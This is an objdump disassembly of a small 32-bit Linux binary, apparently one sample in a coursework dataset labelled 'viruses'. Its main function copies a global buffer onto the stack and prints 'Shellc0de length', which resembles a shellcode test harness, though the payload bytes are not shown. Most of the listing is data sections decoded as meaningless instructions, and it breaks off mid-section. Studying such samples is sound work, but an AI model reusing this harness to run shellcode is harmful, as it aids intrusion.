
/home/stas/Coursach/Выборки/compiled/viruses/13441:     формат файла elf32-i386


Дизассемблирование раздела .interp:

08048154 <.interp>:
 8048154:	2f                   	das    
 8048155:	6c                   	insb   (%dx),%es:(%edi)
 8048156:	69 62 2f 6c 64 2d 6c 	imul   $0x6c2d646c,0x2f(%edx),%esp
 804815d:	69 6e 75 78 2e 73 6f 	imul   $0x6f732e78,0x75(%esi),%ebp
 8048164:	2e 32 00             	xor    %cs:(%eax),%al

Дизассемблирование раздела .note.ABI-tag:

08048168 <.note.ABI-tag>:
 8048168:	04 00                	add    $0x0,%al
 804816a:	00 00                	add    %al,(%eax)
 804816c:	10 00                	adc    %al,(%eax)
 804816e:	00 00                	add    %al,(%eax)
 8048170:	01 00                	add    %eax,(%eax)
 8048172:	00 00                	add    %al,(%eax)
 8048174:	47                   	inc    %edi
 8048175:	4e                   	dec    %esi
 8048176:	55                   	push   %ebp
 8048177:	00 00                	add    %al,(%eax)
 8048179:	00 00                	add    %al,(%eax)
 804817b:	00 02                	add    %al,(%edx)
 804817d:	00 00                	add    %al,(%eax)
 804817f:	00 06                	add    %al,(%esi)
 8048181:	00 00                	add    %al,(%eax)
 8048183:	00 18                	add    %bl,(%eax)
 8048185:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .note.gnu.build-id:

08048188 <.note.gnu.build-id>:
 8048188:	04 00                	add    $0x0,%al
 804818a:	00 00                	add    %al,(%eax)
 804818c:	14 00                	adc    $0x0,%al
 804818e:	00 00                	add    %al,(%eax)
 8048190:	03 00                	add    (%eax),%eax
 8048192:	00 00                	add    %al,(%eax)
 8048194:	47                   	inc    %edi
 8048195:	4e                   	dec    %esi
 8048196:	55                   	push   %ebp
 8048197:	00 58 9a             	add    %bl,-0x66(%eax)
 804819a:	59                   	pop    %ecx
 804819b:	42                   	inc    %edx
 804819c:	5f                   	pop    %edi
 804819d:	72 49                	jb     80481e8 <_init-0x154>
 804819f:	63 9d 3c 9b f8 11    	arpl   %bx,0x11f89b3c(%ebp)
 80481a5:	bc 10 37 47 82       	mov    $0x82473710,%esp
 80481aa:	7c 7b                	jl     8048227 <_init-0x115>

Дизассемблирование раздела .gnu.hash:

080481ac <.gnu.hash>:
 80481ac:	02 00                	add    (%eax),%al
 80481ae:	00 00                	add    %al,(%eax)
 80481b0:	07                   	pop    %es
 80481b1:	00 00                	add    %al,(%eax)
 80481b3:	00 01                	add    %al,(%ecx)
 80481b5:	00 00                	add    %al,(%eax)
 80481b7:	00 05 00 00 00 00    	add    %al,0x0
 80481bd:	20 00                	and    %al,(%eax)
 80481bf:	20 00                	and    %al,(%eax)
 80481c1:	00 00                	add    %al,(%eax)
 80481c3:	00 07                	add    %al,(%edi)
 80481c5:	00 00                	add    %al,(%eax)
 80481c7:	00                   	.byte 0x0
 80481c8:	ad                   	lods   %ds:(%esi),%eax
 80481c9:	4b                   	dec    %ebx
 80481ca:	e3 c0                	jecxz  804818c <_init-0x1b0>

Дизассемблирование раздела .dynsym:

080481cc <.dynsym>:
	...
 80481dc:	32 00                	xor    (%eax),%al
	...
 80481e6:	00 00                	add    %al,(%eax)
 80481e8:	12 00                	adc    (%eax),%al
 80481ea:	00 00                	add    %al,(%eax)
 80481ec:	21 00                	and    %eax,(%eax)
	...
 80481f6:	00 00                	add    %al,(%eax)
 80481f8:	12 00                	adc    (%eax),%al
 80481fa:	00 00                	add    %al,(%eax)
 80481fc:	1a 00                	sbb    (%eax),%al
	...
 8048206:	00 00                	add    %al,(%eax)
 8048208:	12 00                	adc    (%eax),%al
 804820a:	00 00                	add    %al,(%eax)
 804820c:	52                   	push   %edx
	...
 8048215:	00 00                	add    %al,(%eax)
 8048217:	00 20                	add    %ah,(%eax)
 8048219:	00 00                	add    %al,(%eax)
 804821b:	00 39                	add    %bh,(%ecx)
	...
 8048225:	00 00                	add    %al,(%eax)
 8048227:	00 12                	add    %dl,(%edx)
 8048229:	00 00                	add    %al,(%eax)
 804822b:	00 40 00             	add    %al,0x0(%eax)
	...
 8048236:	00 00                	add    %al,(%eax)
 8048238:	12 00                	adc    (%eax),%al
 804823a:	00 00                	add    %al,(%eax)
 804823c:	0b 00                	or     (%eax),%eax
 804823e:	00 00                	add    %al,(%eax)
 8048240:	cc                   	int3   
 8048241:	85 04 08             	test   %eax,(%eax,%ecx,1)
 8048244:	04 00                	add    $0x0,%al
 8048246:	00 00                	add    %al,(%eax)
 8048248:	11 00                	adc    %eax,(%eax)
 804824a:	0f                   	.byte 0xf
	...

Дизассемблирование раздела .dynstr:

0804824c <.dynstr>:
 804824c:	00 6c 69 62          	add    %ch,0x62(%ecx,%ebp,2)
 8048250:	63 2e                	arpl   %bp,(%esi)
 8048252:	73 6f                	jae    80482c3 <_init-0x79>
 8048254:	2e 36 00 5f 49       	cs add %bl,%cs:%ss:0x49(%edi)
 8048259:	4f                   	dec    %edi
 804825a:	5f                   	pop    %edi
 804825b:	73 74                	jae    80482d1 <_init-0x6b>
 804825d:	64 69 6e 5f 75 73 65 	imul   $0x64657375,%fs:0x5f(%esi),%ebp
 8048264:	64 
 8048265:	00 73 74             	add    %dh,0x74(%ebx)
 8048268:	72 63                	jb     80482cd <_init-0x6f>
 804826a:	70 79                	jo     80482e5 <_init-0x57>
 804826c:	00 5f 5f             	add    %bl,0x5f(%edi)
 804826f:	73 74                	jae    80482e5 <_init-0x57>
 8048271:	61                   	popa   
 8048272:	63 6b 5f             	arpl   %bp,0x5f(%ebx)
 8048275:	63 68 6b             	arpl   %bp,0x6b(%eax)
 8048278:	5f                   	pop    %edi
 8048279:	66 61                	popaw  
 804827b:	69 6c 00 70 72 69 6e 	imul   $0x746e6972,0x70(%eax,%eax,1),%ebp
 8048282:	74 
 8048283:	66                   	data16
 8048284:	00 73 74             	add    %dh,0x74(%ebx)
 8048287:	72 6c                	jb     80482f5 <_init-0x47>
 8048289:	65 6e                	outsb  %gs:(%esi),(%dx)
 804828b:	00 5f 5f             	add    %bl,0x5f(%edi)
 804828e:	6c                   	insb   (%dx),%es:(%edi)
 804828f:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%edx),%esp
 8048296:	72 74                	jb     804830c <_init-0x30>
 8048298:	5f                   	pop    %edi
 8048299:	6d                   	insl   (%dx),%es:(%edi)
 804829a:	61                   	popa   
 804829b:	69 6e 00 5f 5f 67 6d 	imul   $0x6d675f5f,0x0(%esi),%ebp
 80482a2:	6f                   	outsl  %ds:(%esi),(%dx)
 80482a3:	6e                   	outsb  %ds:(%esi),(%dx)
 80482a4:	5f                   	pop    %edi
 80482a5:	73 74                	jae    804831b <_init-0x21>
 80482a7:	61                   	popa   
 80482a8:	72 74                	jb     804831e <_init-0x1e>
 80482aa:	5f                   	pop    %edi
 80482ab:	5f                   	pop    %edi
 80482ac:	00 47 4c             	add    %al,0x4c(%edi)
 80482af:	49                   	dec    %ecx
 80482b0:	42                   	inc    %edx
 80482b1:	43                   	inc    %ebx
 80482b2:	5f                   	pop    %edi
 80482b3:	32 2e                	xor    (%esi),%ch
 80482b5:	34 00                	xor    $0x0,%al
 80482b7:	47                   	inc    %edi
 80482b8:	4c                   	dec    %esp
 80482b9:	49                   	dec    %ecx
 80482ba:	42                   	inc    %edx
 80482bb:	43                   	inc    %ebx
 80482bc:	5f                   	pop    %edi
 80482bd:	32 2e                	xor    (%esi),%ch
 80482bf:	30 00                	xor    %al,(%eax)

Дизассемблирование раздела .gnu.version:

080482c2 <.gnu.version>:
 80482c2:	00 00                	add    %al,(%eax)
 80482c4:	02 00                	add    (%eax),%al
 80482c6:	03 00                	add    (%eax),%eax
 80482c8:	02 00                	add    (%eax),%al
 80482ca:	00 00                	add    %al,(%eax)
 80482cc:	02 00                	add    (%eax),%al
 80482ce:	02 00                	add    (%eax),%al
 80482d0:	01 00                	add    %eax,(%eax)

Дизассемблирование раздела .gnu.version_r:

080482d4 <.gnu.version_r>:
 80482d4:	01 00                	add    %eax,(%eax)
 80482d6:	02 00                	add    (%eax),%al
 80482d8:	01 00                	add    %eax,(%eax)
 80482da:	00 00                	add    %al,(%eax)
 80482dc:	10 00                	adc    %al,(%eax)
 80482de:	00 00                	add    %al,(%eax)
 80482e0:	00 00                	add    %al,(%eax)
 80482e2:	00 00                	add    %al,(%eax)
 80482e4:	14 69                	adc    $0x69,%al
 80482e6:	69 0d 00 00 03 00 61 	imul   $0x61,0x30000,%ecx
 80482ed:	00 00 00 
 80482f0:	10 00                	adc    %al,(%eax)
 80482f2:	00 00                	add    %al,(%eax)
 80482f4:	10 69 69             	adc    %ch,0x69(%ecx)
 80482f7:	0d 00 00 02 00       	or     $0x20000,%eax
 80482fc:	6b 00 00             	imul   $0x0,(%eax),%eax
 80482ff:	00 00                	add    %al,(%eax)
 8048301:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .rel.dyn:

08048304 <.rel.dyn>:
 8048304:	fc                   	cld    
 8048305:	9f                   	lahf   
 8048306:	04 08                	add    $0x8,%al
 8048308:	06                   	push   %es
 8048309:	04 00                	add    $0x0,%al
	...

Дизассемблирование раздела .rel.plt:

0804830c <.rel.plt>:
 804830c:	0c a0                	or     $0xa0,%al
 804830e:	04 08                	add    $0x8,%al
 8048310:	07                   	pop    %es
 8048311:	01 00                	add    %eax,(%eax)
 8048313:	00 10                	add    %dl,(%eax)
 8048315:	a0 04 08 07 02       	mov    0x2070804,%al
 804831a:	00 00                	add    %al,(%eax)
 804831c:	14 a0                	adc    $0xa0,%al
 804831e:	04 08                	add    $0x8,%al
 8048320:	07                   	pop    %es
 8048321:	03 00                	add    (%eax),%eax
 8048323:	00 18                	add    %bl,(%eax)
 8048325:	a0 04 08 07 04       	mov    0x4070804,%al
 804832a:	00 00                	add    %al,(%eax)
 804832c:	1c a0                	sbb    $0xa0,%al
 804832e:	04 08                	add    $0x8,%al
 8048330:	07                   	pop    %es
 8048331:	05 00 00 20 a0       	add    $0xa0200000,%eax
 8048336:	04 08                	add    $0x8,%al
 8048338:	07                   	pop    %es
 8048339:	06                   	push   %es
	...

Дизассемблирование раздела .init:

0804833c <_init>:
 804833c:	53                   	push   %ebx
 804833d:	83 ec 08             	sub    $0x8,%esp
 8048340:	e8 bb 00 00 00       	call   8048400 <__x86.get_pc_thunk.bx>
 8048345:	81 c3 bb 1c 00 00    	add    $0x1cbb,%ebx
 804834b:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 8048351:	85 c0                	test   %eax,%eax
 8048353:	74 05                	je     804835a <_init+0x1e>
 8048355:	e8 46 00 00 00       	call   80483a0 <__gmon_start__@plt>
 804835a:	83 c4 08             	add    $0x8,%esp
 804835d:	5b                   	pop    %ebx
 804835e:	c3                   	ret    

Дизассемблирование раздела .plt:

08048360 <printf@plt-0x10>:
 8048360:	ff 35 04 a0 04 08    	pushl  0x804a004
 8048366:	ff 25 08 a0 04 08    	jmp    *0x804a008
 804836c:	00 00                	add    %al,(%eax)
	...

08048370 <printf@plt>:
 8048370:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 8048376:	68 00 00 00 00       	push   $0x0
 804837b:	e9 e0 ff ff ff       	jmp    8048360 <_init+0x24>

08048380 <__stack_chk_fail@plt>:
 8048380:	ff 25 10 a0 04 08    	jmp    *0x804a010
 8048386:	68 08 00 00 00       	push   $0x8
 804838b:	e9 d0 ff ff ff       	jmp    8048360 <_init+0x24>

08048390 <strcpy@plt>:
 8048390:	ff 25 14 a0 04 08    	jmp    *0x804a014
 8048396:	68 10 00 00 00       	push   $0x10
 804839b:	e9 c0 ff ff ff       	jmp    8048360 <_init+0x24>

080483a0 <__gmon_start__@plt>:
 80483a0:	ff 25 18 a0 04 08    	jmp    *0x804a018
 80483a6:	68 18 00 00 00       	push   $0x18
 80483ab:	e9 b0 ff ff ff       	jmp    8048360 <_init+0x24>

080483b0 <strlen@plt>:
 80483b0:	ff 25 1c a0 04 08    	jmp    *0x804a01c
 80483b6:	68 20 00 00 00       	push   $0x20
 80483bb:	e9 a0 ff ff ff       	jmp    8048360 <_init+0x24>

080483c0 <__libc_start_main@plt>:
 80483c0:	ff 25 20 a0 04 08    	jmp    *0x804a020
 80483c6:	68 28 00 00 00       	push   $0x28
 80483cb:	e9 90 ff ff ff       	jmp    8048360 <_init+0x24>

Дизассемблирование раздела .text:

080483d0 <_start>:
 80483d0:	31 ed                	xor    %ebp,%ebp
 80483d2:	5e                   	pop    %esi
 80483d3:	89 e1                	mov    %esp,%ecx
 80483d5:	83 e4 f0             	and    $0xfffffff0,%esp
 80483d8:	50                   	push   %eax
 80483d9:	54                   	push   %esp
 80483da:	52                   	push   %edx
 80483db:	68 b0 85 04 08       	push   $0x80485b0
 80483e0:	68 40 85 04 08       	push   $0x8048540
 80483e5:	51                   	push   %ecx
 80483e6:	56                   	push   %esi
 80483e7:	68 cd 84 04 08       	push   $0x80484cd
 80483ec:	e8 cf ff ff ff       	call   80483c0 <__libc_start_main@plt>
 80483f1:	f4                   	hlt    
 80483f2:	66 90                	xchg   %ax,%ax
 80483f4:	66 90                	xchg   %ax,%ax
 80483f6:	66 90                	xchg   %ax,%ax
 80483f8:	66 90                	xchg   %ax,%ax
 80483fa:	66 90                	xchg   %ax,%ax
 80483fc:	66 90                	xchg   %ax,%ax
 80483fe:	66 90                	xchg   %ax,%ax

08048400 <__x86.get_pc_thunk.bx>:
 8048400:	8b 1c 24             	mov    (%esp),%ebx
 8048403:	c3                   	ret    
 8048404:	66 90                	xchg   %ax,%ax
 8048406:	66 90                	xchg   %ax,%ax
 8048408:	66 90                	xchg   %ax,%ax
 804840a:	66 90                	xchg   %ax,%ax
 804840c:	66 90                	xchg   %ax,%ax
 804840e:	66 90                	xchg   %ax,%ax

08048410 <deregister_tm_clones>:
 8048410:	b8 97 a0 04 08       	mov    $0x804a097,%eax
 8048415:	2d 94 a0 04 08       	sub    $0x804a094,%eax
 804841a:	83 f8 06             	cmp    $0x6,%eax
 804841d:	77 01                	ja     8048420 <deregister_tm_clones+0x10>
 804841f:	c3                   	ret    
 8048420:	b8 00 00 00 00       	mov    $0x0,%eax
 8048425:	85 c0                	test   %eax,%eax
 8048427:	74 f6                	je     804841f <deregister_tm_clones+0xf>
 8048429:	55                   	push   %ebp
 804842a:	89 e5                	mov    %esp,%ebp
 804842c:	83 ec 18             	sub    $0x18,%esp
 804842f:	c7 04 24 94 a0 04 08 	movl   $0x804a094,(%esp)
 8048436:	ff d0                	call   *%eax
 8048438:	c9                   	leave  
 8048439:	c3                   	ret    
 804843a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi

08048440 <register_tm_clones>:
 8048440:	b8 94 a0 04 08       	mov    $0x804a094,%eax
 8048445:	2d 94 a0 04 08       	sub    $0x804a094,%eax
 804844a:	c1 f8 02             	sar    $0x2,%eax
 804844d:	89 c2                	mov    %eax,%edx
 804844f:	c1 ea 1f             	shr    $0x1f,%edx
 8048452:	01 d0                	add    %edx,%eax
 8048454:	d1 f8                	sar    %eax
 8048456:	75 01                	jne    8048459 <register_tm_clones+0x19>
 8048458:	c3                   	ret    
 8048459:	ba 00 00 00 00       	mov    $0x0,%edx
 804845e:	85 d2                	test   %edx,%edx
 8048460:	74 f6                	je     8048458 <register_tm_clones+0x18>
 8048462:	55                   	push   %ebp
 8048463:	89 e5                	mov    %esp,%ebp
 8048465:	83 ec 18             	sub    $0x18,%esp
 8048468:	89 44 24 04          	mov    %eax,0x4(%esp)
 804846c:	c7 04 24 94 a0 04 08 	movl   $0x804a094,(%esp)
 8048473:	ff d2                	call   *%edx
 8048475:	c9                   	leave  
 8048476:	c3                   	ret    
 8048477:	89 f6                	mov    %esi,%esi
 8048479:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi

08048480 <__do_global_dtors_aux>:
 8048480:	80 3d 92 a0 04 08 00 	cmpb   $0x0,0x804a092
 8048487:	75 13                	jne    804849c <__do_global_dtors_aux+0x1c>
 8048489:	55                   	push   %ebp
 804848a:	89 e5                	mov    %esp,%ebp
 804848c:	83 ec 08             	sub    $0x8,%esp
 804848f:	e8 7c ff ff ff       	call   8048410 <deregister_tm_clones>
 8048494:	c6 05 92 a0 04 08 01 	movb   $0x1,0x804a092
 804849b:	c9                   	leave  
 804849c:	f3 c3                	repz ret 
 804849e:	66 90                	xchg   %ax,%ax

080484a0 <frame_dummy>:
 80484a0:	a1 10 9f 04 08       	mov    0x8049f10,%eax
 80484a5:	85 c0                	test   %eax,%eax
 80484a7:	74 1f                	je     80484c8 <frame_dummy+0x28>
 80484a9:	b8 00 00 00 00       	mov    $0x0,%eax
 80484ae:	85 c0                	test   %eax,%eax
 80484b0:	74 16                	je     80484c8 <frame_dummy+0x28>
 80484b2:	55                   	push   %ebp
 80484b3:	89 e5                	mov    %esp,%ebp
 80484b5:	83 ec 18             	sub    $0x18,%esp
 80484b8:	c7 04 24 10 9f 04 08 	movl   $0x8049f10,(%esp)
 80484bf:	ff d0                	call   *%eax
 80484c1:	c9                   	leave  
 80484c2:	e9 79 ff ff ff       	jmp    8048440 <register_tm_clones>
 80484c7:	90                   	nop
 80484c8:	e9 73 ff ff ff       	jmp    8048440 <register_tm_clones>

080484cd <main>:
 80484cd:	55                   	push   %ebp
 80484ce:	89 e5                	mov    %esp,%ebp
 80484d0:	83 e4 f0             	and    $0xfffffff0,%esp
 80484d3:	83 ec 50             	sub    $0x50,%esp
 80484d6:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 80484dc:	89 44 24 4c          	mov    %eax,0x4c(%esp)
 80484e0:	31 c0                	xor    %eax,%eax
 80484e2:	8d 44 24 14          	lea    0x14(%esp),%eax
 80484e6:	83 c0 08             	add    $0x8,%eax
 80484e9:	c7 00 60 a0 04 08    	movl   $0x804a060,(%eax)
 80484ef:	c7 44 24 04 60 a0 04 	movl   $0x804a060,0x4(%esp)
 80484f6:	08 
 80484f7:	8d 44 24 18          	lea    0x18(%esp),%eax
 80484fb:	89 04 24             	mov    %eax,(%esp)
 80484fe:	e8 8d fe ff ff       	call   8048390 <strcpy@plt>
 8048503:	c7 04 24 60 a0 04 08 	movl   $0x804a060,(%esp)
 804850a:	e8 a1 fe ff ff       	call   80483b0 <strlen@plt>
 804850f:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048513:	c7 04 24 d0 85 04 08 	movl   $0x80485d0,(%esp)
 804851a:	e8 51 fe ff ff       	call   8048370 <printf@plt>
 804851f:	b8 00 00 00 00       	mov    $0x0,%eax
 8048524:	8b 54 24 4c          	mov    0x4c(%esp),%edx
 8048528:	65 33 15 14 00 00 00 	xor    %gs:0x14,%edx
 804852f:	74 05                	je     8048536 <main+0x69>
 8048531:	e8 4a fe ff ff       	call   8048380 <__stack_chk_fail@plt>
 8048536:	c9                   	leave  
 8048537:	c3                   	ret    
 8048538:	66 90                	xchg   %ax,%ax
 804853a:	66 90                	xchg   %ax,%ax
 804853c:	66 90                	xchg   %ax,%ax
 804853e:	66 90                	xchg   %ax,%ax

08048540 <__libc_csu_init>:
 8048540:	55                   	push   %ebp
 8048541:	57                   	push   %edi
 8048542:	31 ff                	xor    %edi,%edi
 8048544:	56                   	push   %esi
 8048545:	53                   	push   %ebx
 8048546:	e8 b5 fe ff ff       	call   8048400 <__x86.get_pc_thunk.bx>
 804854b:	81 c3 b5 1a 00 00    	add    $0x1ab5,%ebx
 8048551:	83 ec 1c             	sub    $0x1c,%esp
 8048554:	8b 6c 24 30          	mov    0x30(%esp),%ebp
 8048558:	8d b3 0c ff ff ff    	lea    -0xf4(%ebx),%esi
 804855e:	e8 d9 fd ff ff       	call   804833c <_init>
 8048563:	8d 83 08 ff ff ff    	lea    -0xf8(%ebx),%eax
 8048569:	29 c6                	sub    %eax,%esi
 804856b:	c1 fe 02             	sar    $0x2,%esi
 804856e:	85 f6                	test   %esi,%esi
 8048570:	74 27                	je     8048599 <__libc_csu_init+0x59>
 8048572:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
 8048578:	8b 44 24 38          	mov    0x38(%esp),%eax
 804857c:	89 2c 24             	mov    %ebp,(%esp)
 804857f:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048583:	8b 44 24 34          	mov    0x34(%esp),%eax
 8048587:	89 44 24 04          	mov    %eax,0x4(%esp)
 804858b:	ff 94 bb 08 ff ff ff 	call   *-0xf8(%ebx,%edi,4)
 8048592:	83 c7 01             	add    $0x1,%edi
 8048595:	39 f7                	cmp    %esi,%edi
 8048597:	75 df                	jne    8048578 <__libc_csu_init+0x38>
 8048599:	83 c4 1c             	add    $0x1c,%esp
 804859c:	5b                   	pop    %ebx
 804859d:	5e                   	pop    %esi
 804859e:	5f                   	pop    %edi
 804859f:	5d                   	pop    %ebp
 80485a0:	c3                   	ret    
 80485a1:	eb 0d                	jmp    80485b0 <__libc_csu_fini>
 80485a3:	90                   	nop
 80485a4:	90                   	nop
 80485a5:	90                   	nop
 80485a6:	90                   	nop
 80485a7:	90                   	nop
 80485a8:	90                   	nop
 80485a9:	90                   	nop
 80485aa:	90                   	nop
 80485ab:	90                   	nop
 80485ac:	90                   	nop
 80485ad:	90                   	nop
 80485ae:	90                   	nop
 80485af:	90                   	nop

080485b0 <__libc_csu_fini>:
 80485b0:	f3 c3                	repz ret 

Дизассемблирование раздела .fini:

080485b4 <_fini>:
 80485b4:	53                   	push   %ebx
 80485b5:	83 ec 08             	sub    $0x8,%esp
 80485b8:	e8 43 fe ff ff       	call   8048400 <__x86.get_pc_thunk.bx>
 80485bd:	81 c3 43 1a 00 00    	add    $0x1a43,%ebx
 80485c3:	83 c4 08             	add    $0x8,%esp
 80485c6:	5b                   	pop    %ebx
 80485c7:	c3                   	ret    

Дизассемблирование раздела .rodata:

080485c8 <_fp_hw>:
 80485c8:	03 00                	add    (%eax),%eax
	...

080485cc <_IO_stdin_used>:
 80485cc:	01 00                	add    %eax,(%eax)
 80485ce:	02 00                	add    (%eax),%al
 80485d0:	53                   	push   %ebx
 80485d1:	68 65 6c 6c 63       	push   $0x636c6c65
 80485d6:	30 64 65 20          	xor    %ah,0x20(%ebp,%eiz,2)
 80485da:	6c                   	insb   (%dx),%es:(%edi)
 80485db:	65 6e                	outsb  %gs:(%esi),(%dx)
 80485dd:	67 74 68             	addr16 je 8048648 <_IO_stdin_used+0x7c>
 80485e0:	3a 20                	cmp    (%eax),%ah
 80485e2:	25 64 0a 52 75       	and    $0x75520a64,%eax
 80485e7:	6e                   	outsb  %ds:(%esi),(%dx)
 80485e8:	6e                   	outsb  %ds:(%esi),(%dx)
 80485e9:	69 6e 67 2e 2e 2e 2e 	imul   $0x2e2e2e2e,0x67(%esi),%ebp
 80485f0:	2e 2e 2e 0a 0a       	cs cs or %cs:(%edx),%cl
	...

Дизассемблирование раздела .eh_frame_hdr:

080485f8 <.eh_frame_hdr>:
 80485f8:	01 1b                	add    %ebx,(%ebx)
 80485fa:	03 3b                	add    (%ebx),%edi
 80485fc:	28 00                	sub    %al,(%eax)
 80485fe:	00 00                	add    %al,(%eax)
 8048600:	04 00                	add    $0x0,%al
 8048602:	00 00                	add    %al,(%eax)
 8048604:	68 fd ff ff 44       	push   $0x44fffffd
 8048609:	00 00                	add    %al,(%eax)
 804860b:	00 d5                	add    %dl,%ch
 804860d:	fe                   	(bad)  
 804860e:	ff                   	(bad)  
 804860f:	ff 68 00             	ljmp   *0x0(%eax)
 8048612:	00 00                	add    %al,(%eax)
 8048614:	48                   	dec    %eax
 8048615:	ff                   	(bad)  
 8048616:	ff                   	(bad)  
 8048617:	ff 88 00 00 00 b8    	decl   -0x48000000(%eax)
 804861d:	ff                   	(bad)  
 804861e:	ff                   	(bad)  
 804861f:	ff c4                	inc    %esp
 8048621:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .eh_frame:

08048624 <__FRAME_END__-0xac>:
 8048624:	14 00                	adc    $0x0,%al
 8048626:	00 00                	add    %al,(%eax)
 8048628:	00 00                	add    %al,(%eax)
 804862a:	00 00                	add    %al,(%eax)
 804862c:	01 7a 52             	add    %edi,0x52(%edx)
 804862f:	00 01                	add    %al,(%ecx)
 8048631:	7c 08                	jl     804863b <_IO_stdin_used+0x6f>
 8048633:	01 1b                	add    %ebx,(%ebx)
 8048635:	0c 04                	or     $0x4,%al
 8048637:	04 88                	add    $0x88,%al
 8048639:	01 00                	add    %eax,(%eax)
 804863b:	00 20                	add    %ah,(%eax)
 804863d:	00 00                	add    %al,(%eax)
 804863f:	00 1c 00             	add    %bl,(%eax,%eax,1)
 8048642:	00 00                	add    %al,(%eax)
 8048644:	1c fd                	sbb    $0xfd,%al
 8048646:	ff                   	(bad)  
 8048647:	ff 70 00             	pushl  0x0(%eax)
 804864a:	00 00                	add    %al,(%eax)
 804864c:	00 0e                	add    %cl,(%esi)
 804864e:	08 46 0e             	or     %al,0xe(%esi)
 8048651:	0c 4a                	or     $0x4a,%al
 8048653:	0f 0b                	ud2    
 8048655:	74 04                	je     804865b <_IO_stdin_used+0x8f>
 8048657:	78 00                	js     8048659 <_IO_stdin_used+0x8d>
 8048659:	3f                   	aas    
 804865a:	1a 3b                	sbb    (%ebx),%bh
 804865c:	2a 32                	sub    (%edx),%dh
 804865e:	24 22                	and    $0x22,%al
 8048660:	1c 00                	sbb    $0x0,%al
 8048662:	00 00                	add    %al,(%eax)
 8048664:	40                   	inc    %eax
 8048665:	00 00                	add    %al,(%eax)
 8048667:	00 65 fe             	add    %ah,-0x2(%ebp)
 804866a:	ff                   	(bad)  
 804866b:	ff 6b 00             	ljmp   *0x0(%ebx)
 804866e:	00 00                	add    %al,(%eax)
 8048670:	00 41 0e             	add    %al,0xe(%ecx)
 8048673:	08 85 02 42 0d 05    	or     %al,0x50d4202(%ebp)
 8048679:	02 67 c5             	add    -0x3b(%edi),%ah
 804867c:	0c 04                	or     $0x4,%al
 804867e:	04 00                	add    $0x0,%al
 8048680:	38 00                	cmp    %al,(%eax)
 8048682:	00 00                	add    %al,(%eax)
 8048684:	60                   	pusha  
 8048685:	00 00                	add    %al,(%eax)
 8048687:	00 b8 fe ff ff 61    	add    %bh,0x61fffffe(%eax)
 804868d:	00 00                	add    %al,(%eax)
 804868f:	00 00                	add    %al,(%eax)
 8048691:	41                   	inc    %ecx
 8048692:	0e                   	push   %cs
 8048693:	08 85 02 41 0e 0c    	or     %al,0xc0e4102(%ebp)
 8048699:	87 03                	xchg   %eax,(%ebx)
 804869b:	43                   	inc    %ebx
 804869c:	0e                   	push   %cs
 804869d:	10 86 04 41 0e 14    	adc    %al,0x140e4104(%esi)
 80486a3:	83 05 4e 0e 30 02 48 	addl   $0x48,0x2300e4e
 80486aa:	0e                   	push   %cs
 80486ab:	14 41                	adc    $0x41,%al
 80486ad:	c3                   	ret    
 80486ae:	0e                   	push   %cs
 80486af:	10 41 c6             	adc    %al,-0x3a(%ecx)
 80486b2:	0e                   	push   %cs
 80486b3:	0c 41                	or     $0x41,%al
 80486b5:	c7                   	(bad)  
 80486b6:	0e                   	push   %cs
 80486b7:	08 41 c5             	or     %al,-0x3b(%ecx)
 80486ba:	0e                   	push   %cs
 80486bb:	04 10                	add    $0x10,%al
 80486bd:	00 00                	add    %al,(%eax)
 80486bf:	00 9c 00 00 00 ec fe 	add    %bl,-0x1140000(%eax,%eax,1)
 80486c6:	ff                   	(bad)  
 80486c7:	ff 02                	incl   (%edx)
 80486c9:	00 00                	add    %al,(%eax)
 80486cb:	00 00                	add    %al,(%eax)
 80486cd:	00 00                	add    %al,(%eax)
	...

080486d0 <__FRAME_END__>:
 80486d0:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .init_array:

08049f08 <__frame_dummy_init_array_entry>:
 8049f08:	a0                   	.byte 0xa0
 8049f09:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .fini_array:

08049f0c <__do_global_dtors_aux_fini_array_entry>:
 8049f0c:	80                   	.byte 0x80
 8049f0d:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .jcr:

08049f10 <__JCR_END__>:
 8049f10:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .dynamic:

08049f14 <_DYNAMIC>:
 8049f14:	01 00                	add    %eax,(%eax)
 8049f16:	00 00                	add    %al,(%eax)
 8049f18:	01 00                	add    %eax,(%eax)
 8049f1a:	00 00                	add    %al,(%eax)
 8049f1c:	0c 00                	or     $0x0,%al
 8049f1e:	00 00                	add    %al,(%eax)
 8049f20:	3c 83                	cmp    $0x83,%al
 8049f22:	04 08                	add    $0x8,%al
 8049f24:	0d 00 00 00 b4       	or     $0xb4000000,%eax
 8049f29:	85 04 08             	test   %eax,(%eax,%ecx,1)
 8049f2c:	19 00                	sbb    %eax,(%eax)
 8049f2e:	00 00                	add    %al,(%eax)
 8049f30:	08 9f 04 08 1b 00    	or     %bl,0x1b0804(%edi)
 8049f36:	00 00                	add    %al,(%eax)
 8049f38:	04 00                	add    $0x0,%al
 8049f3a:	00 00                	add    %al,(%eax)
 8049f3c:	1a 00                	sbb    (%eax),%al
 8049f3e:	00 00                	add    %al,(%eax)
 8049f40:	0c 9f                	or     $0x9f,%al
 8049f42:	04 08                	add    $0x8,%al
 8049f44:	1c 00                	sbb    $0x0,%al
 8049f46:	00 00                	add    %al,(%eax)
 8049f48:	04 00                	add    $0x0,%al
 8049f4a:	00 00                	add    %al,(%eax)
 8049f4c:	f5                   	cmc    
 8049f4d:	fe                   	(bad)  
 8049f4e:	ff 6f ac             	ljmp   *-0x54(%edi)
 8049f51:	81 04 08 05 00 00 00 	addl   $0x5,(%eax,%ecx,1)
 8049f58:	4c                   	dec    %esp
 8049f59:	82                   	(bad)  
 8049f5a:	04 08                	add    $0x8,%al
 8049f5c:	06                   	push   %es
 8049f5d:	00 00                	add    %al,(%eax)
